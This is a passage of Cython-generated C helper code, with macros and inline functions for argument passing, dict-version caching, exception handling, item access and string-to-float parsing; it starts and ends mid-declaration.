__Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);\n#else\n#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)\n#endif\n\n\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStrNoError(PyObject* obj, PyObject* attr_name);\n\n\nstatic PyObject *__Pyx_GetBuiltinName(PyObject *name);\n\n\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyList_FromArray(PyObject *const *src, Py_ssize_t n);\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON || CYTHON_METH_FASTCALL\nstatic CYTHON_INLINE PyObject* __Pyx_PyTuple_FromArray(PyObject *const *src, Py_ssize_t n);\n#endif\n\n\n#include <string.h>\n\n\nstatic CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals);\n\n\nstatic CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals);\n\n\n#if CYTHON_AVOID_BORROWED_REFS\n    #define __Pyx_ArgRef_VARARGS(args, i) __Pyx_PySequence_ITEM(args, i)\n#elif CYTHON_ASSUME_SAFE_MACROS\n    #define __Pyx_ArgRef_VARARGS(args, i) __Pyx_NewRef(__Pyx_PyTuple_GET_ITEM(args, i))\n#else\n    #define __Pyx_ArgRef_VARARGS(args, i) __Pyx_XNewRef(PyTuple_GetItem(args, i))\n#endif\n#define __Pyx_NumKwargs_VARARGS(kwds) PyDict_Size(kwds)\n#define __Pyx_KwValues_VARARGS(args, nargs) NULL\n#define __Pyx_GetKwValue_VARARGS(kw, kwvalues, s) __Pyx_PyDict_GetItemStrWithError(kw, s)\n#define __Pyx_KwargsAsDict_VARARGS(kw, kwvalues) PyDict_Copy(kw)\n#if CYTHON_METH_FASTCALL\n    #define __Pyx_ArgRef_FASTCALL(args, i) __Pyx_NewRef(args[i])\n    #define __Pyx_NumKwargs_FASTCALL(kwds) __Pyx_PyTuple_GET_SIZE(kwds)\n    #define __Pyx_KwValues_FASTCALL(args, nargs) ((args) + (nargs))\n    static CYTHON_INLINE PyObject * __Pyx_GetKwValue_FASTCALL(PyObject *kwnames, PyObject *const *kwvalues, PyObject *s);\n  #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030d0000 || CYTHON_COMPILING_IN_LIMITED_API\n    CYTHON_UNUSED static PyObject *__Pyx_KwargsAsDict_FASTCALL(PyObject *kwnames, PyObject *const *kwvalues);\n  #else\n    #define __Pyx_KwargsAsDict_FASTCALL(kw, kwvalues) _PyStack_AsDict(kwvalues, kw)\n  #endif\n#else\n    #define __Pyx_ArgRef_FASTCALL __Pyx_ArgRef_VARARGS\n    #define __Pyx_NumKwargs_FASTCALL __Pyx_NumKwargs_VARARGS\n    #define __Pyx_KwValues_FASTCALL __Pyx_KwValues_VARARGS\n    #define __Pyx_GetKwValue_FASTCALL __Pyx_GetKwValue_VARARGS\n    #define __Pyx_KwargsAsDict_FASTCALL __Pyx_KwargsAsDict_VARARGS\n#endif\n#define __Pyx_ArgsSlice_VARARGS(args, start, stop) PyTuple_GetSlice(args, start, stop)\n#if CYTHON_METH_FASTCALL || (CYTHON_COMPILING_IN_CPYTHON && CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS)\n#define __Pyx_ArgsSlice_FASTCALL(args, start, stop) __Pyx_PyTuple_FromArray(args + start, stop - start)\n#else\n#define __Pyx_ArgsSlice_FASTCALL(args, start, stop) PyTuple_GetSlice(args, start, stop)\n#endif\n\n\n#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS\n#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)\n#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)\n#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\\\n    (version_var) = __PYX_GET_DICT_VERSION(dict);\\\n    (cache_var) = (value);\n#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\\\n    static PY_UINT64_T __pyx_dict_version = 0;\\\n    static PyObject *__pyx_dict_cached_value = NULL;\\\n    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\\\n        (VAR) = __pyx_dict_cached_value;\\\n    } else {\\\n        (VAR) = __pyx_dict_cached_value = (LOOKUP);\\\n        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\\\n    }\\\n}\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);\nstatic CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);\n#else\n#define __PYX_GET_DICT_VERSION(dict)  (0)\n#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\n#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);\n#endif\n\n\n#if CYTHON_USE_DICT_VERSIONS\n#define __Pyx_GetModuleGlobalName(var, name)  do {\\\n    static PY_UINT64_T __pyx_dict_version = 0;\\\n    static PyObject *__pyx_dict_cached_value = NULL;\\\n    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_mstate_global->__pyx_d))) ?\\\n        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\\\n        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\\\n} while(0)\n#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\\\n    PY_UINT64_T __pyx_dict_version;\\\n    PyObject *__pyx_dict_cached_value;\\\n    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\\\n} while(0)\nstatic PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);\n#else\n#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)\n#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)\nstatic CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);\n#endif\n\n\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);\n#else\n#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)\n#endif\n\n\n#if CYTHON_COMPILING_IN_PYPY\n    #define __Pyx_PyObject_FormatSimple(s, f) (\\\n        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\\\n        PyObject_Format(s, f))\n#elif CYTHON_USE_TYPE_SLOTS\n    #define __Pyx_PyObject_FormatSimple(s, f) (\\\n        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\\\n        likely(PyLong_CheckExact(s)) ? PyLong_Type.tp_repr(s) :\\\n        likely(PyFloat_CheckExact(s)) ? PyFloat_Type.tp_repr(s) :\\\n        PyObject_Format(s, f))\n#else\n    #define __Pyx_PyObject_FormatSimple(s, f) (\\\n        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\\\n        PyObject_Format(s, f))\n#endif\n\n\nstatic PyObject* __Pyx_PyUnicode_Join(PyObject** values, Py_ssize_t value_count, Py_ssize_t result_ulength,\n                                      Py_UCS4 max_char);\n\n\n#if CYTHON_FAST_PYCALL\n#if !CYTHON_VECTORCALL\n#define __Pyx_PyFunction_FastCall(func, args, nargs)\\\n    __Pyx_PyFunction_FastCallDict((func), (args), (nargs), NULL)\nstatic PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject *const *args, Py_ssize_t nargs, PyObject *kwargs);\n#endif\n#define __Pyx_BUILD_ASSERT_EXPR(cond)\\\n    (sizeof(char [1 - 2*!(cond)]) - 1)\n#ifndef Py_MEMBER_SIZE\n#define Py_MEMBER_SIZE(type, member) sizeof(((type *)0)->member)\n#endif\n#if !CYTHON_VECTORCALL\n#if PY_VERSION_HEX >= 0x03080000\n  #include "frameobject.h"\n  #define __Pxy_PyFrame_Initialize_Offsets()\n  #define __Pyx_PyFrame_GetLocalsplus(frame)  ((frame)->f_localsplus)\n#else\n  static size_t __pyx_pyframe_localsplus_offset = 0;\n  #include "frameobject.h"\n  #define __Pxy_PyFrame_Initialize_Offsets()\\\n    ((void)__Pyx_BUILD_ASSERT_EXPR(sizeof(PyFrameObject) == offsetof(PyFrameObject, f_localsplus) + Py_MEMBER_SIZE(PyFrameObject, f_localsplus)),\\\n     (void)(__pyx_pyframe_localsplus_offset = ((size_t)PyFrame_Type.tp_basicsize) - Py_MEMBER_SIZE(PyFrameObject, f_localsplus)))\n  #define __Pyx_PyFrame_GetLocalsplus(frame)\\\n    (assert(__pyx_pyframe_localsplus_offset), (PyObject **)(((char *)(frame)) + __pyx_pyframe_localsplus_offset))\n#endif\n#endif\n#endif\n\n\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg);\n#endif\n\n\n#define __Pyx_PyObject_FastCall(func, args, nargs)  __Pyx_PyObject_FastCallDict(func, args, (size_t)(nargs), NULL)\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_FastCallDict(PyObject *func, PyObject * const*args, size_t nargs, PyObject *kwargs);\n\n\n#if CYTHON_VECTORCALL && PY_VERSION_HEX >= 0x03090000\n#define __Pyx_PyObject_FastCallMethod(name, args, nargsf) PyObject_VectorcallMethod(name, args, nargsf, NULL)\n#else\nstatic PyObject *__Pyx_PyObject_FastCallMethod(PyObject *name, PyObject *const *args, size_t nargsf);\n#endif\n\n\nstatic void __Pyx_RaiseUnboundLocalError(const char *varname);\n\n\n#if CYTHON_USE_PYLIST_INTERNALS && CYTHON_ASSUME_SAFE_MACROS\nstatic CYTHON_INLINE int __Pyx_ListComp_Append(PyObject* list, PyObject* x) {\n    PyListObject* L = (PyListObject*) list;\n    Py_ssize_t len = Py_SIZE(list);\n    if (likely(L->allocated > len)) {\n        Py_INCREF(x);\n        #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030d0000\n        L->ob_item[len] = x;\n        #else\n        PyList_SET_ITEM(list, len, x);\n        #endif\n        __Pyx_SET_SIZE(list, len + 1);\n        return 0;\n    }\n    return PyList_Append(list, x);\n}\n#else\n#define __Pyx_ListComp_Append(L,x) PyList_Append(L,x)\n#endif\n\n\n#if CYTHON_FAST_THREAD_STATE\n#define __Pyx_GetException(type, value, tb)  __Pyx__GetException(__pyx_tstate, type, value, tb)\nstatic int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);\n#else\nstatic int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb);\n#endif\n\n\nstatic void __Pyx_Generator_Replace_StopIteration(int in_async_gen);\n\n\n#define __Pyx_PyObject_Unicode(obj)\\\n    (likely(PyUnicode_CheckExact(obj)) ? __Pyx_NewRef(obj) : PyObject_Str(obj))\n\n\nCYTHON_UNUSED static int __Pyx_VectorcallBuilder_AddArg_Check(PyObject *key, PyObject *value, PyObject *builder, PyObject **args, int n);\n#if CYTHON_VECTORCALL\n#if PY_VERSION_HEX >= 0x03090000\n#define __Pyx_Object_Vectorcall_CallFromBuilder PyObject_Vectorcall\n#else\n#define __Pyx_Object_Vectorcall_CallFromBuilder _PyObject_Vectorcall\n#endif\n#define __Pyx_MakeVectorcallBuilderKwds(n) PyTuple_New(n)\nstatic int __Pyx_VectorcallBuilder_AddArg(PyObject *key, PyObject *value, PyObject *builder, PyObject **args, int n);\nstatic int __Pyx_VectorcallBuilder_AddArgStr(const char *key, PyObject *value, PyObject *builder, PyObject **args, int n);\n#else\n#define __Pyx_Object_Vectorcall_CallFromBuilder __Pyx_PyObject_FastCallDict\n#define __Pyx_MakeVectorcallBuilderKwds(n) __Pyx_PyDict_NewPresized(n)\n#define __Pyx_VectorcallBuilder_AddArg(key, value, builder, args, n) PyDict_SetItem(builder, key, value)\n#define __Pyx_VectorcallBuilder_AddArgStr(key, value, builder, args, n) PyDict_SetItemString(builder, key, value)\n#endif\n\n\nstatic CYTHON_INLINE PyObject* __Pyx_PyUnicode_Unicode(PyObject *obj);\n\n\n#define __Pyx_GetItemInt(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck, has_gil)\\\n    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\\\n    __Pyx_GetItemInt_Fast(o, (Py_ssize_t)i, is_list, wraparound, boundscheck) :\\\n    (is_list ? (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL) :\\\n               __Pyx_GetItemInt_Generic(o, to_py_func(i))))\n#define __Pyx_GetItemInt_List(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck, has_gil)\\\n    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\\\n    __Pyx_GetItemInt_List_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\\\n    (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL))\nstatic CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,\n                                                              int wraparound, int boundscheck);\n#define __Pyx_GetItemInt_Tuple(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck, has_gil)\\\n    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\\\n    __Pyx_GetItemInt_Tuple_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\\\n    (PyErr_SetString(PyExc_IndexError, "tuple index out of range"), (PyObject*)NULL))\nstatic CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,\n                                                              int wraparound, int boundscheck);\nstatic PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j);\nstatic CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i,\n                                                     int is_list, int wraparound, int boundscheck);\n\n\n#if !CYTHON_COMPILING_IN_PYPY\nstatic PyObject *__Pyx_PyDict_GetItem(PyObject *d, PyObject* key);\n#define __Pyx_PyObject_Dict_GetItem(obj, name)\\\n    (likely(PyDict_CheckExact(obj)) ?\\\n     __Pyx_PyDict_GetItem(obj, name) : PyObject_GetItem(obj, name))\n#else\n#define __Pyx_PyDict_GetItem(d, key) PyObject_GetItem(d, key)\n#define __Pyx_PyObject_Dict_GetItem(obj, name)  PyObject_GetItem(obj, name)\n#endif\n\n\n#if CYTHON_USE_PYTYPE_LOOKUP && CYTHON_USE_TYPE_SLOTS\n#define __Pyx_PyObject_LookupSpecialNoError(obj, attr_name)  __Pyx__PyObject_LookupSpecial(obj, attr_name, 0)\n#define __Pyx_PyObject_LookupSpecial(obj, attr_name)  __Pyx__PyObject_LookupSpecial(obj, attr_name, 1)\nstatic CYTHON_INLINE PyObject* __Pyx__PyObject_LookupSpecial(PyObject* obj, PyObject* attr_name, int with_error);\n#else\n#define __Pyx_PyObject_LookupSpecialNoError(o,n) __Pyx_PyObject_GetAttrStrNoError(o,n)\n#define __Pyx_PyObject_LookupSpecial(o,n) __Pyx_PyObject_GetAttrStr(o,n)\n#endif\n\n\n#if CYTHON_USE_EXC_INFO_STACK && CYTHON_FAST_THREAD_STATE\nstatic _PyErr_StackItem * __Pyx_PyErr_GetTopmostException(PyThreadState *tstate);\n#endif\n\n\n#if CYTHON_FAST_THREAD_STATE\n#define __Pyx_ExceptionSave(type, value, tb)  __Pyx__ExceptionSave(__pyx_tstate, type, value, tb)\nstatic CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);\n#define __Pyx_ExceptionReset(type, value, tb)  __Pyx__ExceptionReset(__pyx_tstate, type, value, tb)\nstatic CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);\n#else\n#define __Pyx_ExceptionSave(type, value, tb)   PyErr_GetExcInfo(type, value, tb)\n#define __Pyx_ExceptionReset(type, value, tb)  PyErr_SetExcInfo(type, value, tb)\n#endif\n\n\n#if CYTHON_FAST_THREAD_STATE\n#define __Pyx_ExceptionSwap(type, value, tb)  __Pyx__ExceptionSwap(__pyx_tstate, type, value, tb)\nstatic CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);\n#else\nstatic CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb);\n#endif\n\n\nstatic void __Pyx_RaiseDoubleKeywordsError(const char* func_name, PyObject* kw_name);\n\n\nstatic CYTHON_INLINE int __Pyx_ParseKeywords(\n    PyObject *kwds, PyObject *const *kwvalues, PyObject ** const argnames[],\n    PyObject *kwds2, PyObject *values[],\n    Py_ssize_t num_pos_args, Py_ssize_t num_kwargs,\n    const char* function_name,\n    int ignore_unknown_kwargs\n);\n\n\n#define __Pyx_CallCFunction(cfunc, self, args)\\\n    ((PyCFunction)(void(*)(void))(cfunc)->func)(self, args)\n#define __Pyx_CallCFunctionWithKeywords(cfunc, self, args, kwargs)\\\n    ((PyCFunctionWithKeywords)(void(*)(void))(cfunc)->func)(self, args, kwargs)\n#define __Pyx_CallCFunctionFast(cfunc, self, args, nargs)\\\n    ((__Pyx_PyCFunctionFast)(void(*)(void))(PyCFunction)(cfunc)->func)(self, args, nargs)\n#define __Pyx_CallCFunctionFastWithKeywords(cfunc, self, args, nargs, kwnames)\\\n    ((__Pyx_PyCFunctionFastWithKeywords)(void(*)(void))(PyCFunction)(cfunc)->func)(self, args, nargs, kwnames)\n\n\ntypedef struct {\n    PyObject *type;\n    PyObject **method_name;\n#if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING && CYTHON_ATOMICS\n    __pyx_atomic_int_type initialized;\n#endif\n    PyCFunction func;\n    PyObject *method;\n    int flag;\n} __Pyx_CachedCFunction;\n#if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\nstatic CYTHON_INLINE int __Pyx_CachedCFunction_GetAndSetInitializing(__Pyx_CachedCFunction *cfunc) {\n#if !CYTHON_ATOMICS\n    return 1;\n#else\n    __pyx_nonatomic_int_type expected = 0;\n    if (__pyx_atomic_int_cmp_exchange(&cfunc->initialized, &expected, 1)) {\n        return 0;\n    }\n    return expected;\n#endif\n}\nstatic CYTHON_INLINE void __Pyx_CachedCFunction_SetFinishedInitializing(__Pyx_CachedCFunction *cfunc) {\n#if CYTHON_ATOMICS\n    __pyx_atomic_store(&cfunc->initialized, 2);\n#endif\n}\n#else\n#define __Pyx_CachedCFunction_GetAndSetInitializing(cfunc) 2\n#define __Pyx_CachedCFunction_SetFinishedInitializing(cfunc)\n#endif\n\n\nCYTHON_UNUSED\nstatic PyObject* __Pyx__CallUnboundCMethod2(__Pyx_CachedCFunction* cfunc, PyObject* self, PyObject* arg1, PyObject* arg2);\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject *__Pyx_CallUnboundCMethod2(__Pyx_CachedCFunction *cfunc, PyObject *self, PyObject *arg1, PyObject *arg2);\n#else\n#define __Pyx_CallUnboundCMethod2(cfunc, self, arg1, arg2)  __Pyx__CallUnboundCMethod2(cfunc, self, arg1, arg2)\n#endif\n\n\nstatic void __Pyx_RaiseArgtupleInvalid(const char* func_name, int exact,\n    Py_ssize_t num_min, Py_ssize_t num_max, Py_ssize_t num_found);\n\n\n#if !CYTHON_COMPILING_IN_PYPY\nstatic CYTHON_INLINE PyObject* __Pyx_PyLong_AddObjC(PyObject *op1, PyObject *op2, long intval, int inplace, int zerodivision_check);\n#else\n#define __Pyx_PyLong_AddObjC(op1, op2, intval, inplace, zerodivision_check)\\\n    (inplace ? PyNumber_InPlaceAdd(op1, op2) : PyNumber_Add(op1, op2))\n#endif\n\n\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg);\n\n\n#define __Pyx_PyUnicode_FromBInt_bint(value)\\\n    ((value) ? __Pyx_NewRef(__pyx_mstate_global->__pyx_n_u_True_2) : __Pyx_NewRef(__pyx_mstate_global->__pyx_n_u_False))\n\n\nstatic CYTHON_INLINE int __Pyx_PySequence_ContainsTF(PyObject* item, PyObject* seq, int eq) {\n    int result = PySequence_Contains(seq, item);\n    return unlikely(result < 0) ? result : (result == (eq == Py_EQ));\n}\n\n\nstatic CYTHON_INLINE void __Pyx_RaiseTooManyValuesError(Py_ssize_t expected);\n\n\nstatic CYTHON_INLINE void __Pyx_RaiseNeedMoreValuesError(Py_ssize_t index);\n\n\nstatic CYTHON_INLINE int __Pyx_IterFinish(void);\n\n\nstatic int __Pyx_IternextUnpackEndCheck(PyObject *retval, Py_ssize_t expected);\n\n\nstatic CYTHON_INLINE int __Pyx_PyUnicode_ContainsTF(PyObject* substring, PyObject* text, int eq) {\n    int result = PyUnicode_Contains(text, substring);\n    return unlikely(result < 0) ? result : (result == (eq == Py_EQ));\n}\n\n\nstatic double __Pyx_SlowPyString_AsDouble(PyObject *obj);\nstatic double __Pyx__PyBytes_AsDouble(PyObject *obj, const char* start, Py_ssize_t length);\nstatic CYTHON_INLINE double __Pyx_PyBytes_AsDouble(PyObject *obj) {\n    char* as_c_string;\n    Py_ssize_t size;\n#if CYTHON_ASSUME_SAFE_MACROS && CYTHON_ASSUME_SAFE_SIZE\n    as_c_string = PyBytes_AS_STRING(obj);\n    size = PyBytes_GET_SIZE(obj);\n#else\n    if (PyBytes_AsStringAndSize(obj, &as_c_string, &size) < 0) {\n        return (double)-1;\n    }\n#endif\n    return __Pyx__PyBytes_AsDouble(obj, as_c_string, size);\n}\nstatic CYTHON_INLINE double __Pyx_PyByteArray_AsDouble(PyObject *obj) {\n    char* as_c_string;\n    Py_ssize_t size;\n#if CYTHON_ASSUME_SAFE_MACROS && CYTHON_ASSUME_SAFE_SIZE\n    as_c_string = PyByteArray_AS_STRING(obj);\n    size = PyByteArray_GET_SIZE(obj);\n#else\n    as_c_string = PyByteArray_AsString(obj);\n    if (as_c_string == NULL) {\n        return (double)-1;\n    }\n    size = PyByteArray_Size(obj);\n#endif\n    return __Pyx__PyBytes_AsDouble(obj, as_c_string, size);\n}\n\n\n#if !CYTHON_COMPILING_IN_PYPY && CYTHON_ASSUME_SAFE_MACROS\nstatic const char* __Pyx__PyUnicode_AsDouble_Copy(const void* data, const int kind, char* buffer, Py_ssize_t start, Py_ssize_t end) {\n    int last_was_punctuation;\n    Py_ssize_t i;\n    last_was_punctuation = 1;\n    for (i=start; i <= end; i++) {\n        Py_UCS4 chr = PyUnicode_READ(kind, data, i);\n        int is_punctuation = (chr == \'_\') | (chr == \'.\');\n        *buffer = (char)chr;\n        buffer += (chr != \'_\');\n        if (unlikely(chr > 127)) goto parse_failure;\n        if (unlikely(last_was_punctuation & is_punctuation)) goto parse_failure;\n        last_was_punctuation = is_punctuation;\n    }\n    if (unlikely(last_was_punctuation)) goto parse_failure;\n    *buffer = \'\\0\';\n    return buffer;\nparse_failure:\n    return NULL;\n}\nstatic double __Pyx__PyUnicode_AsDouble_inf_nan(const void* data, int kind, Py_ssize_t start, Py_ssize_t length) {\n    int matches = 1;\n    Py_UCS4 chr;\n    Py_UCS4 sign = PyUnicode_READ(kind, data, start);\n    int is_signed = (sign == \'-\') | (sign == \'+\');\n    start += is_signed;\n    length -= is_signed;\n    switch (PyUnicode_READ(kind, data, start)) {\n        #ifdef Py_NAN\n        case \'n\':\n        case \'N\':\n            if (unlikely(length != 3)) goto parse_failure;\n            chr = PyUnicode_READ(kind, data, start+1);\n            matches &= (chr == \'a\') | (chr == \'A\');\n            chr = PyUnicode_READ(kind, data, start+2);\n            matches &= (chr == \'n\') | (chr == \'N\');\n            if (unlikely(!matches)) goto parse_failure;\n            return (sign == \'-\') ? -Py_NAN : Py_NAN;\n        #endif\n        case \'i\':\n        case \'I\':\n            if (unlikely(length < 3)) goto parse_failure;\n            chr = PyUnicode_READ(kind, data, start+1);\n            matches &= (chr == \'n\') | (chr == \'N\');\n            chr = PyUnicode_READ(kind, data, start+2);\n            matches &= (chr == \'f\') | (chr == \'F\');\n            if (likely(length == 3 && matches))\n                return (sign == \'-\') ? -Py_HUGE_VAL : Py_HUGE_VAL;\n            if (unlikely(length != 8)) goto parse_failure;\n            chr = PyUnicode_READ(kind, data, start+3);\n            matches &= (chr == \'i\') | (chr == \'I\');\n            chr = PyUnicode_READ(kind, data, start+4);\n            matches &= (chr == \'n\') | (chr == \'N\');\n            chr = PyUnicode_READ(kind, data, start+5);\n            matches &= (chr == \'i\') | (chr == \'I\');\n            chr = PyUnicode_READ(kind, data, start+6);\n            matches &= (chr == \'t\') | (chr == \'T\');\n            chr = PyUnicode_READ(kind, data, start+7);\n            matches &= (chr == \'y\') | (chr == \'Y\');\n            if (unlikely(!matches)) goto parse_failure;\n            return (sign == \'-\') ? -Py_HUGE_VAL : Py_HUGE_VAL;\n        case \'.\': case \'0\': case \'1\': case \'2\': case \'3\': case \'4\': case \'5\': case \'6\': case \'7\': case \'8\': case \'9\':\n            break;\n        default:\n            goto parse_failure;\n    }\n    return 0.0;\nparse_failure:\n    return -1.0;\n}\nstatic double __Pyx_PyUnicode_AsDouble_WithSpaces(PyObject *obj) {\n    double value;\n    const char *last;\n    char *end;\n    Py_ssize_t start, length = PyUnicode_GET_LENGTH(obj);\n    const int kind = PyUnicode_KIND(obj);\n    const void* data = PyUnicode_DATA(obj);\n    start = 0;\n    while (Py_UNICODE_ISSPACE(PyUnicode_READ(kind, data, start)))\n        start++;\n    while (start < length - 1 && Py_UNICODE_ISSPACE(PyUnicode_READ(kind, data, length - 1)))\n        length--;\n    length -= start;\n    if (unlikely(length <= 0)) goto fallback;\n    value = __Pyx__PyUnicode_AsDouble_inf_nan(data, kind, start, length);\n    if (unlikely(value == -1.0)) goto fallback;\n    if (value != 0.0) return value;\n    if (length < 40) {\n        char number[40];\n        last = __Pyx__PyUnicode_AsDouble_Copy(data, kind, number, start, start + length);\n        if (unlikely(!last)) goto fallback;\n        value = PyOS_string_to_double(number, &end, NULL);\n    } else {\n        char *number = (char*) PyMem_Malloc((length + 1) * sizeof(char));\n        if (unlikely(!number)) goto fallback;\n        last = __Pyx__PyUnicode_AsDouble_Copy(data, kind, number, start, start + length);\n        if (unlikely(!last)) {\n            PyMem_Free(number);\n            goto fallback;\n        }\n        value = PyOS_string_to_double(number, &end, NULL);\n        PyMem_Free(number);\n    }\n    if (likely(end == last) || (value == (double)-1 && PyErr_Occurred())) {\n        return value;\n    }\nfallback:\n    return __Pyx_SlowPyString_AsDouble(obj);\n}\n#endif\nstatic CYTHON_INLINE double __Pyx_PyUnicode_AsDouble(PyObject *obj) {\n#if !CYTHON_COMPILING_IN_PYPY && CYTHON_ASSUME_SAFE_MACROS\n    if (unlikely(__Pyx_PyUnicode_READY(obj) == -1))\n        return (double)-1;\n    if (likely(PyUnicode_IS_ASCII(obj))) {\n        const char *s;\n        Py_ssize_t length;\n        s = PyUnicode_AsUTF8AndSize(obj, &length);\n        return __Pyx__PyBytes_AsDouble(obj, s, length);\n    }\n    return __Pyx_PyUnicode_AsDouble_WithSpaces(obj);\n#else\n    return __Pyx_SlowPyString_AsDouble(obj);\n#endif\n}\n\n\nstatic CYTHON_INLINE PyObject* __Pyx__PyNumber_Float(PyObject* obj);\n#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : __Pyx__PyNumber_Float(x))\n\n\n#if !CYTHON_COMPILING_IN_PYPY\nstatic CYTHON_INLINE PyObject* __Pyx_PyLong_TrueDivideObjC(PyObject *op1, PyObject *op2, long intval, int inplace, int zerodivision_check);\n#else\n#define __Pyx_PyLong_TrueDivideObjC(op1, op2, intval, inplace, zerodivision_check)\\\n    (inplace ? PyNumber_InPlaceTrueDivide(op1, op2) : PyNumber_TrueDivide(op1, op2))\n#endif\n\n\n#if CYTHON_USE_UNICODE_WRITER\nstatic PyObject* __Pyx_PyObject_Format(PyObject* s, PyObject* f);\n#else\n#define __Pyx_PyObject_Format(s, f) PyObject_Format(s, f)\n#endif\n\n\n# if CYTHON_COMPILING_IN_CPYTHON\n    #if CYTHON_REFNANNY\n        #define __Pyx_PyUnicode_ConcatInPlace(left, right) __Pyx_PyUnicode_ConcatInPlaceImpl(&left, right, __pyx_refnanny)\n    #else\n        #define __Pyx_PyUnicode_ConcatInPlace(left, right) __Pyx_PyUnicode_ConcatInPlaceImpl(&left, right)\n    #endif\n    static CYTHON_INLINE PyObject *__Pyx_PyUnicode_ConcatInPlaceImpl(PyObject **p_left, PyObject *right\n        #if CYTHON_REFNANNY\n        , void* __pyx_refnanny\n        #endif\n    );\n#else\n#define __Pyx_PyUnicode_ConcatInPlace __Pyx_PyUnicode_Concat\n#endif\n#define __Pyx_PyUnicode_ConcatInPlaceSafe(left, right) ((unlikely((left) == Py_None) || unlikely((right) == Py_None)) ?\\\n    PyNumber_InPlaceAdd(left, right) : __Pyx_PyUnicode_ConcatInPlace(left, right))\n\n\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetSlice(\n        PyObject* obj, Py_ssize_t cstart, Py_ssize_t cstop,\n        PyObject** py_start, PyObject** py_stop, PyObject** py_slice,\n        int has_cstart, int has_cstop, int wraparound);\n\n\n#if CYTHON_USE_PYLIST_INTERNALS && CYTHON_ASSUME_SAFE_MACROS\nstatic CYTHON_INLINE int 